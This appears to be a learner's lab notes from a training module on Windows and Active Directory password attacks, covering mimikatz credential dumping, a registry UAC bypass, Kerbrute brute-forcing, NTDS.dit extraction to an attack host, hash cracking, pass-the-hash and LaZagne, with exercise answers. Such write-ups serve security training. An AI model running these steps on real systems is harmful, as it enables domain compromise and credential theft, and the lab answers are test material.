 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::credman

...SNIP...

Authentication Id : 0 ; 630472 (00000000:00099ec8)
Session           : RemoteInteractive from 3
User Name         : mcharles
Domain            : SRV01
Logon Server      : SRV01
Logon Time        : 4/27/2025 2:40:32 AM
SID               : S-1-5-21-1340203682-1669575078-4153855890-1002
        credman :
         [00000000]
         * Username : mcharles@inlanefreight.local
         * Domain   : onedrive.live.com
         * Password : ...SNIP...

...SNIP...
```

Some other tools which may be used to enumerate and extract stored credentials included [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI), [LaZagne](https://github.com/AlessandroZ/LaZagne), and [DonPAPI](https://github.com/login-securite/DonPAPI).
### Exercise
 
**What is the password mcharles uses for OneDrive?**                          [[RDP]] to with user `sadams` and password        `totally2brow2harmon@`

We need access to the `mcharles` account.

We can use [cmdkey](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey) to enumerate the credentials stored in the current user's profile:

```powershell
C:\Users\sadams>cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=SRV01\mcharles
    Type: Domain Password
    User: SRV01\mcharles
```

Whenever we come across this type of credential, we can use `runas` to impersonate the stored user like so:

```bash
runas /savecred /user:SRV01\mcharles cmd

C:\Users\sadams>runas /savecred /user:SRV01\mcharles cmd

C:\Windows\system32>cmdkey /list

Currently stored credentials:

    Target: WindowsLive:target=virtualapp/didlogical
    Type: Generic
    User: 02jejfxhvabjneqt
    Local machine persistence

    Target: LegacyGeneric:target=onedrive.live.com
    Type: Generic
    User: mcharles@inlanefreight.local
```

```bash
└─$ cp /usr/share/windows-resources/mimikatz/Win32/mimikatz.exe .
└─$ python3 -m http.server 8080 

C:\Users\sadams\Downloads>./mimikatz.exe

PS C:\Users\mcharles\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28> vaultcmd /list
Currently loaded vaults:
        Vault: Web Credentials
        Vault Guid:4BF4C442-9B8A-41A0-B380-DD4A704DDB28
        Location: C:\Users\mcharles\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28

        Vault: Windows Credentials
        Vault Guid:77BC582B-F0A6-4E15-4E80-61736B6F3B29
        Location: C:\Users\mcharles\AppData\Local\Microsoft\Vault

PS C:\Users\mcharles\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28> vaultcmd /listcreds:"Windows Credentials"
Credentials in vault: Windows Credentials
No credentials
PS C:\Users\mcharles\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28> vaultcmd /listcreds:"Web Credentials"
Credentials in vault: Web Credentials
No credentials
```

**Using HINT**
Depending on how you tackle this exercise, you might have to deal with `UAC`. If that is the case, one easy solution can be found by looking up the "msconfig UAC bypass".

Bypass `UAC` via `fodhelper` / `computerdefaults` reg trick:

```
C:\> reg add HKCU\Software\Classes\ms-settings\shell\open\command /f /ve /t REG_SZ /d "cmd.exe" && start fodhelper.exe
C:\> reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f && reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "cmd.exe" /f && start computerdefaults.exe
```

Now we have an elevated shell and we can run `mimikatz` as `Admin`:

```bash
C:\Users\Administrator\Desktop> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # vault::cred 

Inlanefreight#2025
```

## Attacking Active Directory and NTDS.dit

`[[Active Directory]]` (`AD`) is a common and critical directory service in modern enterprise networks. AD is something we will repeatedly encounter, so we need to be familiar with various methods we can use to attack and defend these environments. It is safe to conclude that if the organization uses Windows, then AD is used to manage those Windows systems. Attacking AD is such an extensive and significant topic that we have multiple modules covering the subject.

In this section, we will focus primarily on how we can extract credentials through the use of a `dictionary attack` against `AD accounts` and `dumping hashes` from the `NTDS.dit` file.

Like many of the attacks we have covered thus far, our target must be reachable over the network. This means it is highly likely that we will need to have a foothold established on the internal network to which the target is connected. That said, there are situations where an organization may be using port forwarding to forward the remote desktop protocol (`3389`) or other protocols used for remote access on their [edge router](https://www.cisco.com/c/en/us/products/routers/what-is-an-edge-router.html) to a system on their internal network. Please know that most methods covered in this module simulate the steps after an initial compromise, and a foothold is established on an internal network. Before we get hands-on with the attack methods, let's consider the authentication process once a Windows system has been joined to the domain. This approach will help us better understand the significance of Active Directory and the password attacks it can be susceptible to.

Once a Windows system is joined to a domain, it will `no longer default to referencing the SAM database to validate logon requests`. That domain-joined system will now send authentication requests to be validated by the domain controller before allowing a user to log on. This does not mean the SAM database can no longer be used. Someone looking to log on using a local account in the SAM database can still do so by specifying the `hostname` of the device proceeded by the `Username` (Example: `WS01\nameofuser`) or with direct access to the device then typing `.\` at the logon UI in the `Username` field. This is worthy of consideration because we need to be mindful of what system components are impacted by the attacks we perform. It can also give us additional avenues of attack to consider when targeting Windows desktop operating systems or Windows server operating systems with direct physical access or over a network. Keep in mind that we can also study NTDS attacks by keeping track of this [technique](https://attack.mitre.org/techniques/T1003/003/).

### Dictionary attacks against AD accounts using NetExec

Keep in mind that a dictionary attack is essentially using the power of a computer to guess a username and/or password using a customized list of potential usernames and passwords. It can be rather `noisy` (easy to detect) to conduct these attacks over a network because they can generate a lot of network traffic and alerts on the target system as well as eventually get denied due to login attempt restrictions that may be applied through the use of [Group Policy](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831791\(v=ws.11\)).

When we find ourselves in a scenario where a dictionary attack is a viable next step, we can benefit from trying to tailor our attack as much as possible. In this case, we can consider the organization we are working with to perform the engagement against and use searches on various social media websites and look for an employee directory on the company's website. Doing this can result in us gaining the names of employees that work at the organization. One of the first things a new employee will get is a username. Many organizations follow a naming convention when creating employee usernames. Here are some common conventions to consider:

| Username convention                 | Practical example for `Jane Jill Doe` |
| ----------------------------------- | ------------------------------------- |
| `firstinitiallastname`              | jdoe                                  |
| `firstinitialmiddleinitiallastname` | jjdoe                                 |
| `firstnamelastname`                 | janedoe                               |
| `firstname.lastname`                | jane.doe                              |
| `lastname.firstname`                | doe.jane                              |
| `nickname`                          | doedoehacksstuff                      |
Often, an email address's structure will give us the employee's username (structure: `username@domain`). For example, from the email address `jdoe`@`inlanefreight.com`, we can infer that `jdoe` is the username.

A tip from `MrB3n`: We can often find the email structure by Googling the domain name, i.e., "@inlanefreight.com" and get some valid emails. From there, we can use a script to scrape various social media sites and mashup potential valid usernames. Some organizations try to obfuscate their usernames to prevent spraying, so they may alias their username like a907 (or something similar) back to joe.smith. That way, email messages can get through, but the actual internal username isn't disclosed, making password spraying harder. Sometimes you can use google dorks to search for "inlanefreight.com filetype:pdf" and find some valid usernames in the PDF properties if they were generated using a graphics editor. From there, you may be able to discern the username structure and potentially write a small script to create many possible combinations and then spray to see if any come back valid.
#### Creating a custom list of usernames

Let's say we have done our research and gathered a list of names based on publicly available information. We will keep the list relatively short for the sake of this lesson because organizations can have a huge number of employees. Example list of names:

- Ben Williamson
- Bob Burgerstien
- Jim Stevenson
- Jill Johnson
- Jane Doe

We can create a custom list on our attack host using the names above. We can use a command line-based text editor like `Vim` or a graphical text editor to create our list.

Of course, this is just an example and doesn't include all of the names, but notice how we can include a different naming convention for each name if we do not already know the naming convention used by the target organization.

We can manually create our list(s) or use an `automated list generator` such as the Ruby-based tool [Username Anarchy](https://github.com/urbanadventurer/username-anarchy) to convert a list of real names into common username formats. Once the tool has been cloned to our local attack host using `Git`, we can run it against a list of real names as shown in the example output below:

```bash
mdn0x@htb[/htb]$ ./username-anarchy -i /home/ltnbob/names.txt 
```

Using automated tools can save us time when crafting lists. Still, we will benefit from spending as much time as we can attempting to discover the naming convention an organization is using with usernames because this will reduce the need for us to guess the naming convention.

It is ideal to limit the need to guess as much as possible when conducting password attacks.

#### Enumerating valid usernames with Kerbrute

Before we start guessing passwords for usernames which might not even exist, it may be worthwhile identifying the correct naming convention and confirming the validity of some usernames. We can do this with a tool like [Kerbrute](https://github.com/ropnop/kerbrute). [[Kerbrute]] can be used for brute-forcing, password spraying and username enumeration. Right now, we are only interested in username enumeration, which would look like this:

```bash
mdn0x@htb[/htb]$ ./kerbrute_linux_amd64 userenum --dc 10.129.201.57 --domain inlanefreight.local names.txt
```

#### Launching a brute-force attack with NetExec

```bash
mdn0x@htb[/htb]$ netexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
```


In this example, [[NetExec]] is using [[SMB]] to attempt to logon as user (`-u`) `bwilliamson` using a password (`-p`) list containing a list of commonly used passwords (`/usr/share/wordlists/fasttrack.txt`). If the admins configured an account lockout policy, this attack could lock out the account that we are targeting. At the time of this writing (January 2022), an account lockout policy is not enforced by default with the default group policies that apply to a Windows domain, meaning it is possible that we will come across environments vulnerable to this exact attack we are practicing.

It can be useful to know what might have been left behind by an attack. Knowing this can make our remediation recommendations more impactful and valuable for the client we are working with. On any Windows operating system, an admin can navigate to `Event Viewer` and view the Security events to see the exact actions that were logged. This can inform decisions to implement stricter security controls and assist in any potential investigation that might be involved following a breach.

Once we have discovered some credentials, we could proceed to try to gain remote access to the target domain controller and capture the NTDS.dit file.
### Capturing NTDS.dit

`NT Directory Services` (`NTDS`) is the directory service used with AD to find & organize network resources. Recall that `NTDS.dit` file is stored at `%systemroot%/ntds` on the domain controllers in a [forest](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/using-the-organizational-domain-forest-model). The `.dit` stands for [directory information tree](https://docs.oracle.com/cd/E19901-01/817-7607/dit.html). This is the primary database file associated with AD and stores all domain usernames, password hashes, and other critical schema information. If this file can be captured, we could potentially compromise every account on the domain similar to the technique we covered in this module's `Attacking SAM, SYSTEM, and SECURITY` section. As we practice this technique, consider the importance of protecting AD and brainstorm a few ways to stop this attack from happening.

We can connect to a target DC using the credentials we captured.

```bash
mdn0x@htb[/htb]$ evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
```


[[Evil-WinRM]] connects to a target using the Windows Remote Management service combined with the PowerShell Remoting Protocol to establish a PowerShell session with the target.

#### Checking user account privileges including domain

Once connected, we can check to see what privileges `bwilliamson` has. We can start with looking at the local group membership using the command:

```bash
*Evil-WinRM* PS C:\> net localgroup
```

We are looking to see if the account has local admin rights. To make a copy of the NTDS.dit file, we need local admin (`Administrators group`) or Domain Admin (`Domain Admins group`) (or equivalent) rights. We also will want to check what domain privileges we have.

```bash
*Evil-WinRM* PS C:\> net user bwilliamson
```

This account has both Administrators and Domain Administrator rights which means we can do just about anything we want, including making a copy of the NTDS.dit file.
#### Creating shadow copy of C:

We can use `vssadmin` to create a [Volume Shadow Copy](https://docs.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service) (`VSS`) of the `C:` drive or whatever volume the admin chose when initially installing AD. It is very likely that NTDS will be stored on `C:` as that is the default location selected at install, but it is possible to change the location. We use VSS for this because it is designed to make copies of volumes that may be read & written to actively without needing to bring a particular application or system down. VSS is used by many different backup and disaster recovery software to perform operations.

```
*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:
```

#### Copying NTDS.dit from the VSS

We can then copy the `NTDS.dit` file from the volume shadow copy of `C:` onto another location on the drive to prepare to move `NTDS.dit` to our attack host.

```
*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

Before copying `NTDS.dit` to our attack host, we may want to use the technique we learned earlier to create an SMB share on our attack host. Feel free to go back to the `Attacking SAM, SYSTEM, and SECURITY` section to review that method if needed.
**Note:** As was the case with `SAM`, the hashes stored in `NTDS.dit` are encrypted with a key stored in `SYSTEM`. In order to successfully extract the hashes, one must download both files.
#### Transferring NTDS.dit to attack host

Now `cmd.exe /c move` can be used to move the file from the target DC to the share on our attack host.

```
*Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData 
```

#### Extracting hashes from NTDS.dit

With a copy of `NTDS.dit` on our attack host, we can go ahead and dump the hashes. One way to do this is with Impacket's `secretsdump`:

```bash
mdn0x@htb[/htb]$ impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```
#### A faster method: Using NetExec to capture NTDS.dit

Alternatively, we may benefit from using NetExec to accomplish the same steps shown above, all with one command. This command allows us to utilize VSS to quickly capture and dump the contents of the `NTDS.dit` file conveniently within our terminal session.

```
mdn0x@htb[/htb]$ netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil
```
### Cracking hashes and gaining credentials

We can proceed with creating a text file containing all the NT hashes, or we can individually copy and paste a specific hash into a terminal session and use Hashcat to attempt to crack the hash and a password in cleartext.

```
mdn0x@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

In many of the techniques we have covered so far, we have had success in cracking hashes we've obtained.

`What if we are unsuccessful in cracking a hash?`

### Pass the Hash (PtH) considerations

We can still use hashes to attempt to authenticate with a system using a type of attack called `Pass-the-Hash` (`PtH`). A PtH attack takes advantage of the [NTLM authentication protocol](https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-ntlm#:~:text=NTLM%20uses%20an%20encrypted%20challenge,to%20the%20secured%20NTLM%20credentials) to authenticate a user using a password hash. Instead of `username`:`clear-text password` as the format for login, we can instead use `username`:`password hash`. Here is an example of how this would work:

```bash
mdn0x@htb[/htb]$ evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
```

We can attempt to use this attack when needing to move laterally across a network after the initial compromise of a target. More on `PtH` will be covered in the module `AD Enumeration and Attacks`.
### Exercise

1. What is the name of the file stored on a domain controller that contains the password hashes of all domain accounts?        `NTDS.dit`

2. Submit the NT hash associated with the Administrator user from the example output in the section reading.       `64f12cddaa88057e06a81b54e73b949b`

3. On an engagement you have gone on several social media sites and found the `Inlanefreight` employee names: John Marston IT Director, Carol Johnson Financial Controller and Jennifer Stapleton Logistics Manager. You decide to use these names to conduct your password attacks against the target domain controller. Submit John Marston's credentials as the answer.

```bash
└─$ cat users.txt 
John Marston
Carol Johnson
Jennifer Stapleton
IT Director
Financial Controller
Logistics Manager

└─$ ./username-anarchy -i users.txt > usernames.txt 


└─$ nmap -sC -sV -p 53,88,135,139,389,445,464,636,3268,3269 10.129.202.85
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-17 15:06 +0100
Nmap scan report for kerberos.inlanefreight.htb (10.129.202.85)
Host is up (0.063s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-11-17 14:06:54Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ILF.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: ILF.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: ILF-DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

	sudo nano /etc/krb5.conf

[libdefaults]
    default_realm = ILF.LOCAL
    dns_lookup_realm = false
    dns_lookup_kdc = false
    rdns = false

[realms]
    ILF.LOCAL = {
        kdc = ILF-DC01.ilf.local
        admin_server = ILF-DC01.ilf.local
    }

[domain_realm]
    .ilf.local = ILF.LOCAL
    ilf.local = ILF.LOCAL


┌──(mdn0x㉿mdn0xKali)-[~/HTB/Academy/passwd_attacks]
└─$ ./kerbrute userenum --dc 10.129.202.85 -d ILF.LOCAL usernames.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 11/17/26 - Ronnie Flathers @ropnop

2026/11/17 15:11:29 >  Using KDC(s):
2026/11/17 15:11:29 >   10.129.202.85:88

2026/11/17 15:11:29 >  [+] VALID USERNAME:       jmarston@ILF.LOCAL
2026/11/17 15:11:30 >  [+] VALID USERNAME:       cjohnson@ILF.LOCAL
2026/11/17 15:11:30 >  [+] VALID USERNAME:       jstapleton@ILF.LOCAL
2026/11/17 15:11:30 >  Done! Tested 88 usernames (3 valid) in 0.585 seconds
```

Finding `jmarston` password:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Academy/passwd_attacks]
└─$ nxc smb 10.129.202.85 -u jmarston -p /usr/share/wordlists/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords.txt 
```

OR with the [[Kerbrute]] tool:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Academy/passwd_attacks]
└─$ ./kerbrute bruteuser --dc 10.129.202.85 -d ILF.LOCAL /usr/share/wordlists/fasttrack.txt jmarston 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 11/17/26 - Ronnie Flathers @ropnop

2026/11/17 15:41:57 >  Using KDC(s):
2026/11/17 15:41:57 >   10.129.202.85:88

2026/11/17 15:41:59 >  [+] VALID LOGIN:  jmarston@ILF.LOCAL:P@ssword!
2026/11/17 15:41:59 >  Done! Tested 118 logins (1 successes) in 2.430 seconds

```

4. Capture the `NTDS.dit` file and dump the hashes. Use the techniques taught in this section to crack Jennifer Stapleton's password. Submit her clear-text password as the answer. 


```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Academy/passwd_attacks]
└─$ nxc smb 10.129.202.85 -u jmarston -p P@ssword! -M ntdsutil
SMB         10.129.202.85   445    ILF-DC01         [*] Windows 10 / Server 2019 Build 17763 x64 (name:ILF-DC01) (domain:ILF.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.202.85   445    ILF-DC01         [+] ILF.local\jmarston:P@ssword! (Pwn3d!)
NTDSUTIL    10.129.202.85   445    ILF-DC01         [*] Dumping ntds with ntdsutil.exe to C:\Windows\Temp\179492654
NTDSUTIL    10.129.202.85   445    ILF-DC01         Dumping the NTDS, this could take a while so go grab a redbull...
^[[B^[[B^[[BNTDSUTIL    10.129.202.85   445    ILF-DC01         [+] NTDS.dit dumped to C:\Windows\Temp\179492654
NTDSUTIL    10.129.202.85   445    ILF-DC01         [*] Copying NTDS dump to /tmp/tmpk2wsqalt
NTDSUTIL    10.129.202.85   445    ILF-DC01         [*] NTDS dump copied to /tmp/tmpk2wsqalt
NTDSUTIL    10.129.202.85   445    ILF-DC01         [+] Deleted C:\Windows\Temp\179492654 remote dump directory
NTDSUTIL    10.129.202.85   445    ILF-DC01         [+] Dumping the NTDS, this could take a while so go grab a redbull...
NTDSUTIL    10.129.202.85   445    ILF-DC01         Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
NTDSUTIL    10.129.202.85   445    ILF-DC01         Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
NTDSUTIL    10.129.202.85   445    ILF-DC01         ILF-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:31739618241c7ae27118633214240d97:::                                                                                                                                     
NTDSUTIL    10.129.202.85   445    ILF-DC01         krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cfa046b90861561034285ea9c3b4af2f:::
NTDSUTIL    10.129.202.85   445    ILF-DC01         ILF.local\jmarston:1103:aad3b435b51404eeaad3b435b51404ee:2b391dfc6690cc38547d74b8bd8a5b49:::                                                                                                                            
NTDSUTIL    10.129.202.85   445    ILF-DC01         ILF.local\cjohnson:1104:aad3b435b51404eeaad3b435b51404ee:5fd4475a10d66f33b05e7c2f72712f93:::                                                                                                                            
NTDSUTIL    10.129.202.85   445    ILF-DC01         ILF.local\jstapleton:1108:aad3b435b51404eeaad3b435b51404ee:92fd67fd2f49d0e83744aa82363f021b:::                                                                                                                          
NTDSUTIL    10.129.202.85   445    ILF-DC01         ILF.local\gwaffle:1109:aad3b435b51404eeaad3b435b51404ee:07a0bf5de73a24cb8ca079c1dcd24c13:::                                                                                                                             
NTDSUTIL    10.129.202.85   445    ILF-DC01         LAPTOP01$:1111:aad3b435b51404eeaad3b435b51404ee:be2abbcd5d72030f26740fb531f1d7c4:::                                                                                                                                     
NTDSUTIL    10.129.202.85   445    ILF-DC01         [+] Dumped 9 NTDS hashes to /home/mdn0x/.nxc/logs/ntds/ILF-DC01_10.129.202.85_2026-11-17_154221.ntds of which 7 were added to the database
NTDSUTIL    10.129.202.85   445    ILF-DC01         [*] To extract only enabled accounts from the output file, run the following command: 
NTDSUTIL    10.129.202.85   445    ILF-DC01         [*] grep -iv disabled /home/mdn0x/.nxc/logs/ntds/ILF-DC01_10.129.202.85_2026-11-17_154221.ntds | cut -d ':' -f1
```

Cracking with [[Hashcat]]:

```bash
sudo hashcat -m 1000 92fd67fd2f49d0e83744aa82363f021b /usr/share/wordlists/rockyou.txt

92fd67fd2f49d0e83744aa82363f021b:Winter2008 
```
## Credential Hunting in Windows

Once we have access to a target Windows machine through the GUI or CLI, incorporating credential hunting into our approach can provide significant advantages. `Credential hunting` is the process of performing detailed searches across the file system and through various applications to discover credentials. To understand this concept, let's place ourselves in a scenario. We have gained access to an IT admin's Windows 10 workstation through RDP.
### Search-centric

Many of the tools available to us in Windows have search functionality. In this day and age, there are search-centric features built into most applications and operating systems, so we can use this to our advantage on an engagement. A user may have documented their passwords somewhere on the system. There may even be default credentials that could be found in various files. It would be wise to base our search for credentials on what we know about how the target system is being used. In this case, we know we have access to an IT admin's workstation.

`What might an IT admin be doing on a day-to-day basis and which of those tasks may require credentials?`

We can use this question and consideration to refine our search to reduce the need for random guessing as much as possible.

Whether we end up with access to the GUI or CLI, we know we will have some tools to use for searching but of equal importance is what exactly we are searching for. Here are some helpful key terms we can use that can help us discover some credentials:

- Passwords
- Passphrases
- Keys
- Username
- User account
- Creds
- Users
- Passkeys
- configuration
- dbcredential
- dbpassword
- pwd
- Login
- Credentials

Let's use some of these key terms to search on the IT admin's workstation.
## Search tools

With access to the GUI, it is worth attempting to use `Windows Search` to find files on the target using some of the keywords mentioned above.
By default, it will search various OS settings and the file system for files and applications containing the key term entered in the search bar.
### LaZagne

We can also take advantage of third-party tools like [LaZagne](https://github.com/AlessandroZ/LaZagne) to quickly discover credentials that web browsers or other installed applications may insecurely store. LaZagne is made up of `modules` which each target different software when looking for passwords. Some of the common modules are described in the table below:

| Module   | Description                                                                                       |
| -------- | ------------------------------------------------------------------------------------------------- |
| browsers | Extracts passwords from various browsers including Chromium, Firefox, Microsoft Edge, and Opera   |
| chats    | Extracts passwords from various chat applications including Skype                                 |
| mails    | Searches through mailboxes for passwords including Outlook and Thunderbird                        |
| memory   | Dumps passwords from memory, targeting KeePass and LSASS                                          |
| sysadmin | Extracts passwords from the configuration files of various sysadmin tools like OpenVPN and WinSCP |
| windows  | Extracts Windows-specific credentials targeting LSA secrets, Credential Manager, and more         |
| wifi     | Dumps WiFi credentials                                                                            |
browsers are some of the most interesting places to search for credentials, due to the fact that many of them offer built-in credential storage. In the most popular browsers, such as `Google Chrome`, `Microsoft Edge`, and `Firefox`, stored credentials are encrypted. However, many tools for decrypting the various credentials databases used can be found online, such as [firefox_decrypt](https://github.com/unode/firefox_decrypt) and [decrypt-chrome-passwords](https://github.com/ohyicong/decrypt-chrome-passwords). LaZagne supports `35` different browsers on [[Windows]].

It would be beneficial to keep a [standalone copy](https://github.com/AlessandroZ/LaZagne/releases/) of LaZagne on our attack host so we can quickly transfer it over to the target. `LaZagne.exe` will do just fine for us in this scenario. We can use our RDP client to copy the file over to the target from our attack host. If we are using `xfreerdp` all we must do is copy and paste into the RDP session we have established.

Once `LaZagne.exe` is on the target, we can open command prompt or PowerShell, navigate to the directory the file was uploaded to, and execute the following command:

```bash
start LaZagne.exe all
```

This will execute LaZagne and run `all` included modules. We can include the option `-vv` to study what it is doing in the background. Once we hit enter, it will open another prompt and display the results.

If we used the `-vv` option, we would see attempts to gather passwords from all LaZagne's supported software. We can also look on the GitHub page under the supported software section to see all the software LaZagne will try to gather credentials from. It may be a bit shocking to see how easy it can be to obtain credentials in clear text. Much of this can be attributed to the insecure way many applications store credentials.
### findstr

We can also use [findstr](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/findstr) to search from patterns across many types of files. Keeping in mind common key terms, we can use variations of this command to discover credentials on a Windows target:

There are thousands of tools and key terms we could use to hunt for credentials on Windows operating systems. Know that which ones we choose to use will be primarily based on the function of the computer. If we land on a Windows Server, we may use a different approach than if we land on a Windows Desktop. Always be mindful of how the system is being used, and this will help us know where to look. Sometimes we may even be able to find credentials by navigating and listing directories on the file system as our tools run.

Here are some other places we should keep in mind when credential hunting:

- Passwords in Group Policy in the SYSVOL share
- Passwords in scripts in the SYSVOL share
- Password in scripts on IT shares
- Passwords in `web.config` files on dev machines and IT shares
- Password in `unattend.xml`
- Passwords in the AD user or computer description fields
- KeePass databases (if we are able to guess or crack the master password)
- Found on user systems and shares
- Files with names like `pass.txt`, `passwords.docx`, `passwords.xlsx` found on user systems, shares, and [Sharepoint](https://www.microsoft.com/en-us/microsoft-365/sharepoint/collaboration)
### Exercise 

You have gained access to an IT admin's Windows 10 workstation and begin your credential hunting process by searching for credentials in common storage locations.

`Connect to the target and use what you've learned to discover the answers to the challenge questions`.

RDP to with user "Bob" and password "HTB_@cademy_stdnt!"


1. What password does Bob use to connect to the Switches via SSH?

```bash
┌──(mdn0x㉿mdn0xKali)-[~/Documenti/GitTools/PassHack/LaZagne]
└─$ rustscan -a ilf.local -- -A 


PORT     STATE  SERVICE          VERSION
Open 10.129.202.99:139
Open 10.129.202.99:135
Open 10.129.202.99:445
Open 10.129.202.99:3389
Open 10.129.202.99:5040
Open 10.129.202.99:7680
Open 10.129.202.99:49664
Open 10.129.202.99:49665
Open 10.129.202.99:49666
Open 10.129.202.99:49669
Open 10.129.202.99:49670
Open 10.129.202.99:49667
Open 10.129.202.99:49668
Open 10.129.202.99:49671


PORT      STATE SERVICE       REASON          VERSION
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: LAPTOP01
|   NetBIOS_Domain_Name: LAPTOP01
|   NetBIOS_Computer_Name: LAPTOP01
|   DNS_Domain_Name: Laptop01
|   DNS_Computer_Name: Laptop01
|   Product_Version: 10.0.18362

5040/tcp  open  unknown       syn-ack ttl 127
7680/tcp  open  pando-pub?    syn-ack ttl 127
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC

└─$ sudo nano /etc/krb5.conf


┌──(mdn0x㉿mdn0xKali)-[~/Documenti/GitTools/PassHack/LaZagne]
└─$ xfreerdp3  /u:Bob /p:HTB_@cademy_stdnt! /v:ilf.local
```

Find the Desktop file

![[Pasted image 20261117161307.png]]

`WellConnected123`

2. What is the `GitLab` access code Bob uses?  

```bash
Gitlab access code just in case I lose connectivity with our local Gitlab instance.
3z1ePfGbjWPsTfCsZfjy
```


3.  What credentials does Bob use with WinSCP to connect to the file server? (Format: username:password, Case-Sensitive)

```bash
└─$ python3 -m http.server 8080    
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...


[+] System masterkey decrypted for 66c0784c-3191-4a2b-92e3-78e4d7986659
[+] System masterkey decrypted for 6a505802-6b1c-4420-bcb1-5085b201d5c0
[+] System masterkey decrypted for 83c23bf4-30df-4c94-96d6-e2c4cfcc74b2
[+] System masterkey decrypted for 8977fcf3-a0bb-4352-be54-882d487b8ea5
[+] System masterkey decrypted for cbf5956a-5229-4238-838f-222660dc77e9

########## User: SYSTEM ##########

------------------- Hashdump passwords -----------------

Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
